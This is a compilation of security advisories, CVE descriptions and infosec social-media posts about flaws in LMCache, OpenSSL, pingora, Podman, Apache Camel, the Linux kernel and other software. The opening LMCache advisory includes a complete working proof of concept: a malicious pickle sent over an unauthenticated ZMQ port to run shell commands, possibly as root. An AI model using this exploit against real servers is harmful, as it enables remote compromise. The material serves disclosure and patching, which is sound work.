Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.



### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address


This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle


Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame


```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.


Step 4 - Confirm the command ran as the LMCache user


```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644.


### Patches

Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

### Workarounds

Until you can upgrade:

- Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
- Restrict access to the transport port (5555 by default) with firewall rules or network policies.
- Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

CVE-2025-15467.description:
Issue summary: Parsing CMS AuthEnvelopedData message with maliciously
crafted AEAD parameters can trigger a stack buffer overflow.

Impact summary: A stack buffer overflow may lead to a crash, causing Denial
of Service, or potentially remote code execution.

When parsing CMS AuthEnvelopedData structures that use AEAD ciphers such as
AES-GCM, the IV (Initialization Vector) encoded in the ASN.1 parameters is
copied into a fixed-size stack buffer without verifying that its length fits
the destination. An attacker can supply a crafted CMS message with an
oversized IV, causing a stack-based out-of-bounds write before any
authentication or tag verification occurs.

Applications and services that parse untrusted CMS or PKCS#7 content using
AEAD ciphers (e.g., S/MIME AuthEnvelopedData with AES-GCM) are vulnerable.
Because the overflow occurs prior to authentication, no valid key material
is required to trigger it. While exploitability to remote code execution
depends on platform and toolchain mitigations, the stack-based write
primitive represents a severe risk.

CVE-2025-69419.description:
Issue summary: Calling PKCS12_get_friendlyname() function on a maliciously
crafted PKCS#12 file with a BMPString (UTF-16BE) friendly name containing
non-ASCII BMP code point can trigger a one byte write before the allocated
buffer.

Impact summary: The out-of-bounds write can cause a memory corruption
which can have various consequences including a Denial of Service.

The OPENSSL_uni2utf8() function performs a two-pass conversion of a PKCS#12
BMPString (UTF-16BE) to UTF-8. In the second pass, when emitting UTF-8 bytes,
the helper function bmp_to_utf8() incorrectly forwards the remaining UTF-16
source byte count as the destination buffer capacity to UTF8_putc(). For BMP
code points above U+07FF, UTF-8 requires three bytes, but the forwarded
capacity can be just two bytes. UTF8_putc() then returns -1, and this negative
value is added to the output length without validation, causing the
length to become negative. The subsequent trailing NUL byte is then written
at a negative offset, causing write outside of heap allocated buffer.

The vulnerability is reachable via the public PKCS12_get_friendlyname() API
when parsing attacker-controlled PKCS#12 files. While PKCS12_parse() uses a
different code path that avoids this issue, PKCS12_get_friendlyname() directly
invokes the vulnerable function. Exploitation requires an attacker to provide
a malicious PKCS#12 file to be parsed by the application and the attacker
can just trigger a one zero byte write before the allocated buffer.
For that reason the issue was assessed as Low severity according to our
Security Policy.

The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue,
as the PKCS#12 implementation is outside the OpenSSL FIPS module boundary.

OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.

OpenSSL 1.0.2 is not affected by this issue.

🟠 CVE-2026-105299 - High (8.7)

Summary

Before version 0.9.0, the HTTP/1 upstream path in pingora-proxy passed the downstream request through upstream_request_filter and wrote it to the upstream without removing the client's Connection header, other hop-by-hop headers, or the...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-105299/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-105299.description:
Summary



Before version 0.9.0, the HTTP/1 upstream path in pingora-proxy passed the downstream request through upstream_request_filter and wrote it to the upstream without removing the client's Connection header, other hop-by-hop headers, or the headers Connection nominated, although RFC 9110 Section 7.6.1 requires intermediaries to remove them. The HTTP/2 upstream path already removed Connection and related HTTP/1-specific headers. A client could therefore nominate a header that the application adds in upstream_request_filter (for example, Connection: keep-alive, X-Forwarded-For). A downstream HTTP/1 intermediary that honors Connection would then strip the Pingora-added header before it reached the origin.




Impact



Specifically affects chained deployments where an HTTP/1 intermediary between Pingora and the origin processes Connection nominations (for example, Go's net/http/httputil.ReverseProxy) and the origin trusts headers added by that intermediary (for example, X-Forwarded-For for IP-based authorization). A remote, unauthenticated attacker can have those headers removed, potentially bypassing authorization. The reporter demonstrated access to an IP-restricted endpoint using X-Forwarded-For for IP validation on the origin. This is the same class of issue as CVE-2022-31813 in Apache HTTP Server.




Note that Cloudflare CDN customers were unaffected, as no such chained deployment as described above exists with internal Pingora services, and Connection headers are sanitized before arriving at Pingora gateways.



Mitigation:

  *  

Upgrade to pingora 0.9.0 or later. By default, Pingora now removes hop-by-hop and Connection-nominated headers from upstream requests, and rejects requests whose Connection header nominates Host, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto, or a pseudo-header. This is controlled by PeerOptions::http_upstream_request_policy (HttpUpstreamRequestPolicy). Fix commits:  https://github.com/cloudflare/pingora/commit/28c18e6b6b04dd0bd937234e5950049e6d74cded ,  https://github.com/cloudflare/pingora/commit/ca23f1668eca8e78be7ba62ef0edbd458b40eeee 


  *  

Do not use HttpUpstreamRequestPolicy::preserve() if the origin relies on headers added by Pingora; it restores the old passthrough behavior.


  *  

If you cannot upgrade: in upstream_request_filter, remove the Connection header and every header it nominates before adding trusted headers.

CVE-2026-94603.description:
### Impact
Podman v4.4.0 added a feature where container checkpoints (from the `podman container checkpoint` command) could be distributed via OCI registry, and pulled from that registry and run via the `podman run` command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When `podman run` detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, `podman run --cap-drop=ALL` on an image that is determined to be a checkpoint will ignore `--cap-drop=all` and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, `io.podman.annotations.checkpoint.runtime.name`. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in `podman run` allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality.

### Patch
The commit introducing this functionality was reverted.

3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main)
ea9243e04d1db3886dc3a51ee3300ffb547cfc02 450c64426dbcff1097d3c7911d791101e3d16f4c 2d05a7c61f022d4f24980ea6d307fa53da2b8692 (v6.1)
7728ba0a90094408ad9078e36c3622a651d49616 24706290d5c974f078d8ca284026802515f28e92 29c8c6e50607df7a7d735ace09ff0ea099c0b3e0 (v5.8)

### Workarounds
Images being pulled should be scanned for the `io.podman.annotations.checkpoint.runtime.name` annotation, and rejected if it is present. Podman does not presently have the ability to perform this scanning and rejection automatically.

Also not that rootless containers are not affected as they do not support checkpoint/restore at all currently.

### Credits
This vulnerability was discovered by ADA Logics Ltd using Anthropic's Claude models.

posts.content: CVE-2026-78162 (CRITICAL): Apache Camel's Hazelcast integration allows RCE via unsafe deserialization (4.0.0 – 4.18.5, 4.19.0 – 4.22.1). Upgrade to 4.23.0 or secure Hazelcast configs. Details: https://radar.offseq.com/threat/cve-2026-78162-cwe-502-deserialization-of-untrusted-data-in-apache-software-foundation-apache-camel-21ff192d2f57bb7b #OffSeq #ApacheCamel #Vuln #RCE

CVE-2026-78162.description:
Deserialization of Untrusted Data vulnerability in Apache Camel.



This issue affects Apache Camel: from 4.0.0 before 4.18.5, from 4.19.0 before 4.22.1.



The camel-hazelcast component applies a default Hazelcast JavaSerializationFilterConfig to the instances it creates from its own configuration, a protection introduced by CVE-2026-43865. That change did not reach two of the configuration paths Camel builds itself, so those paths continued to create Hazelcast instances whose Java deserialization is unrestricted. ReplicatedHazelcastAggregationRepository extends HazelcastAggregationRepository but overrides doStart() without calling super.doStart(), keeping its own copy of the bootstrap block, and therefore never received the filter: a route using it without supplying a hazelcastInstance starts a Hazelcast member that deserializes values read from the backing ReplicatedMap with no class restriction. HazelcastDefaultComponent#getOrCreateHzClientInstance() builds its own ClientConfig when hazelcastMode=client is selected and neither a referenced ClientConfig nor hazelcastConfigUri is supplied, and likewise applied no filter, so client-mode endpoints behaved differently from node-mode endpoints for an otherwise identical configuration. In both cases an attacker able to publish into the Hazelcast cluster that the affected instance is attached to can cause a serialized Java object of their choosing to be deserialized inside Hazelcast's own serialization layer, before Camel processes the exchange, resulting in remote code execution. Hazelcast clusters have neither authentication nor TLS enabled by default. Selecting client mode is a topology choice rather than a security option, so neither path required the deployment to opt in to unsafe behaviour.



Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.1. If users are on the 4.18.x releases stream, then they are suggested to upgrade to 4.18.5. The 4.14.x releases stream and earlier reached end of life before this issue was resolved and will not receive a fix, so deployments on those lines must move to a supported release. For deployments that cannot upgrade immediately, supply an explicit Hazelcast configuration carrying a JavaSerializationFilterConfig, or inject a pre-built HazelcastInstance, since a user-supplied configuration is never overwritten by Camel. Alternatively set the JVM-wide filter -Djdk.serialFilter=!java.net.;java.;javax.;org.apache.camel.;!* and enable Hazelcast cluster authentication and TLS to restrict who can reach the cluster.

CVE-2026-103091.description: Missing Authorization (CWE-862) and Initialization of a Resource with an Insecure Default (CWE-1188) in the MCP proxy (HandleStreamPassThrough in mcp_service.go) and OIDC registration flow (GET /info and POST /register in internal/controlplane/server.go) in Google OSS Agent Mesh (SAM) versions 0.1.0-alpha.1 through 0.1.0-alpha.8 allow a remote attacker to self-enroll into the mesh and invoke arbitrary tools across all connected MCP backend nodes. CVE-2026-98260.description:
In the Linux kernel, the following vulnerability has been resolved:

exec: Cleanup POSIX timers right after de_thread()

A per-thread CPU timer holds a reference to the PID of the thread it is
attached to and, while it is armed, its node is queued in that thread's
posix_cputimers. The task is looked up by that PID.

When a non-leader thread exec()s, de_thread() changes which task owns
that PID. pid_task(timer->it.cpu.pid, PIDTYPE_PID) then returns NULL,
but the node is still queued on tsk, which is alive. timer_lock_sighand()
takes a failed lookup to mean that the node is already dequeued, so it
has nothing to undo.

begin_new_exec() calls posix_cpu_timers_exit(me) right after
exec_task_namespaces() and that removes the leftover node, so the state
normally stays invisible. But bprm->point_of_no_return is set before
de_thread(), so if unshare_files(), set_mm_exe_file(), exec_mmap() or
exec_task_namespaces() fails, the task dies before it gets there.
exit_itimers() then frees the k_itimer while its node is still queued,
and reaping tsk later erases that freed node from the rbtree.

In short:

      the non-leader thread B           the parent

  timer_create(CLOCK_THREAD_CPUTIME_ID)
  timer_settime()
    arm_timer()            // the node is queued on B
  execve()
    de_thread(B)
      exchange_tids(B, leader)  // B's PID now belongs to the leader
      release_task(leader)
        __exit_signal(leader)
          posix_cpu_timers_exit(leader)  // cleans leader's queue, not B's
          __unhash_process(leader)  // that PID has no task anymore
    exec_mmap()
      mmap_read_lock_killable(old_mm)
                                kill(B, SIGKILL)
      // -EINTR
  get_signal()
    do_exit()
      exit_itimers()
        posix_timer_delete()
          posix_cpu_timer_del()
        posix_timer_unhash_and_free()  // freed while still queued
                                wait4()
                                  release_task(B)
                                    posix_cpu_timers_exit(B)
                                      cleanup_timerqueue()
                                        timerqueue_del()  // use-after-free

Move the POSIX timer cleanup right after de_thread() before any of the
later failure conditions brings the task into do_exit().

[ tglx: Move the cleanup right after de_thread() ]

CVE-2026-110908.description: Netgate pfSense FRR package (pfSense-pkg-frr) 2.0.2_1 and source revision 2.1.2_1 contain an OS command injection vulnerability in the FRR status filter. An authenticated WebGUI user with only the page-status-frr privilege can supply a filter value that breaks out of a single-quoted sed expression into which escapeshellarg() output is concatenated. Shell command substitution is then evaluated by a popen() pipeline, allowing attacker-selected commands to execute as root. There are updated FRR packages for pfSense Plus 26.07/26.03.1 and CE 2.9.0/2.8.1.

posts.content: CVE-2026-98532: Linux kernel vuln (HIGH) in ipv6_find_hdr() may cause use-after-free via unchecked header offset. Affects systems using openvswitch. Patch available — update ASAP! 🐧 https://radar.offseq.com/threat/in-the-linux-kernel-the-following-vulnerability-has-been-resolved-ipv6-do-not-let-ipv6findhdr-return-e74295795722a0c9 #OffSeq #Linux #Vulnerability #Infosec

CVE-2026-98532.description:
In the Linux kernel, the following vulnerability has been resolved:

ipv6: do not let ipv6_find_hdr() return an offset past the packet end

ipv6_find_hdr() walks the extension header chain, skipping each header by
the length that header itself declares.  ipv6_optlen() returns up to 2048,
and the skip is never checked against skb->len, so the offset stored in
*offset can point past the end of the packet.

openvswitch installs that offset as the transport header, and
update_ipv6_checksum() then reads and writes the transport checksum field
out of bounds:

  BUG: KASAN: slab-use-after-free in inet_proto_csum_replace16+0x445/0x470
  Read of size 2 at addr ffff88810b754b06 by task ovs_ipv6_oob/629
  CPU: 4 UID: 1000 PID: 629 Comm: ovs_ipv6_oob Tainted: G N 7.3.0-rc3+ #348
  Call Trace:
   inet_proto_csum_replace16+0x445/0x470
   set_ipv6_addr+0x3dd/0x460
   do_execute_actions+0x6a3d/0x7c40
   ovs_execute_actions+0xfd/0x480
   ovs_packet_cmd_execute+0xc38/0xf20
   genl_rcv_msg+0x59e/0x870
   netlink_rcv_skb+0x18b/0x450
   genl_rcv+0x2d/0x40
   netlink_unicast+0x6bc/0xa20

  The buggy address belongs to the object at ffff88810b754980
   which belongs to the cache skbuff_small_head of size 704
  The buggy address is located 390 bytes inside of
   freed 704-byte region [ffff88810b754980, ffff88810b754c40)

Other callers use that offset too, so bound it here rather than in one
caller.

Reject a header whose declared length does not fit in the packet.
ipv6_find_hdr() already fails with -EBADMSG on a malformed chain, so this
adds no new failure mode.

CVE-2026-76519.description:
A vulnerability in the Advanced Malware Protection (AMP) feature of Cisco Secure Email Gateway could allow an unauthenticated, remote attacker to write arbitrary files on the underlying operating system.

This vulnerability is due to improper handling of email attachments when the file reputation service is enabled. An attacker could exploit this vulnerability by sending an email that contains a crafted attachment through an affected device. A successful exploit could allow the attacker to write arbitrary files and execute commands with root privileges on the underlying operating system.

CVE-2026-0322.description:
A remote code execution (RCE) vulnerability in the management interface of Palo Alto Networks PAN-OS® software enables an authenticated attacker with network access to execute arbitrary code with root privileges on the firewall.



The security risk posed by this issue is minimized by restricting access to the management interface to only trusted internal IP addresses according to our recommended  best practice deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 .



This issue is applicable to PAN-OS software on PA-Series and VM-Series firewalls and on Panorama (virtual and M-Series).



Cloud NGFW and Prisma® Access are not impacted by this vulnerability.

Mage AI Patches Critical OAuth Bypass in Data Pipeline Orchestration Tool

Mage OSS fixed a critical CVSS 9.8 authentication bypass (CVE-2026-111823) that allows unauthenticated access to data pipelines and cloud credentials. The flaw occurs when the system fails to stop session creation after detecting an OAuth error.

**If you run Mage OSS, update ASAP to a version newer than 0.9.80, because attackers can take over the platform without logging in. Since this attack won't look like password guessing in your logs, review recent sessions and pipeline changes for anything unexpected and change all passwords and keys stored in Mage.**
#cybersecurity #infosec #advisory #vulnerability

Drupal Patches Critical Remote Code Execution Flaws in Core and Entity List Modules

Drupal released emergency patches for two critical remote code execution vulnerabilities (CVE-2026-108097 and CVE-2026-108099) that allow unauthenticated attackers to take control of web servers.

**If you run a Drupal website, update it immediately to version 10.6.19, 11.3.19 or 11.4.10, and update the Entity List module to 3.0.10. Attackers are expected to start exploiting these flaws within hours of the publication of the advisory. If you can't update, uninstall the Field UI module as a temporary fix. If you are on an older, unsupported Drupal version, upgrade as soon as possible because no patch is coming.**

posts.content:
@bagder fair enough. How about situations where no users are affected yet, such as curl's master branch?
E.g. bugs from OSS-Fuzz on the master branch only that does not reproduce when run on a supported release?
Same for static analyzers, such as Coverity, etc.
Can these be automated, so all you need to do is confirm that it doesn't affect previous releases, and you wouldn't have to manually watch and copy the reports from N different sources?

Similarly I don't know if you could convince one of the AI tool users to send you all the bugs affecting master first (that they've already confirmed not to affect supported releases). Looking at your existing CVEs I see at least one that was recently introduced (CVE-2026-86415), that maybe could've been handled as a regular bug if they prioritised master first.
Although no CVE then, but maybe you can come up with another system to "reward" findings like this. Number and severity of CVEs avoided thanks to researcher X, or tool Y should be just as important as those found in existing releases.
(In fact since you're a CNA you could assign CVEs to these, no need for another system, with only git commits as the affected range, if the CVE rules and metadata allow for that?)

Although this won't help with the flood of issues on existing releases, at least new releases are going to be less likely to increase the bug count.

CVE-2026-86415.description:
libcurl's connection cache match function never considers the automatic client
certificate option, so a cached, already authenticated Schannel connection can
be handed to a transfer that got redirected to a different origin, even though
the code explicitly switched off the auto client cert option for that transfer
to prevent exactly this.

posts.content:
@theorangetheme CVE going 6-digits? Yes and no. We had a few 6-digits in past years due to sparse assignment - hell, 2015 it went 7 digits with CVE-2015-1142857. But afaik 2026 is the first year we hit 6 digits naturally?

But also: the one before we go 6 digits being a Kernel vuln that sounds rather innocuous in the official description but is actually apparently a pretty severe sandbox escape and all that.

CVE-2015-1142857.description: On multiple SR-IOV cars it is possible for VF's assigned to guests to send ethernet flow control pause frames via the PF. This includes Linux kernel ixgbe driver before commit f079fa005aae08ee0e1bc32699874ff4f02e11c1, the Linux Kernel i40e/i40evf driver before e7358f54a3954df16d4f87e3cad35063f1c17de5 and the DPDK before commit 3f12b9f23b6499ff66ec8b0de941fb469297e5d0, additionally Multiple vendor NIC firmware is affected.
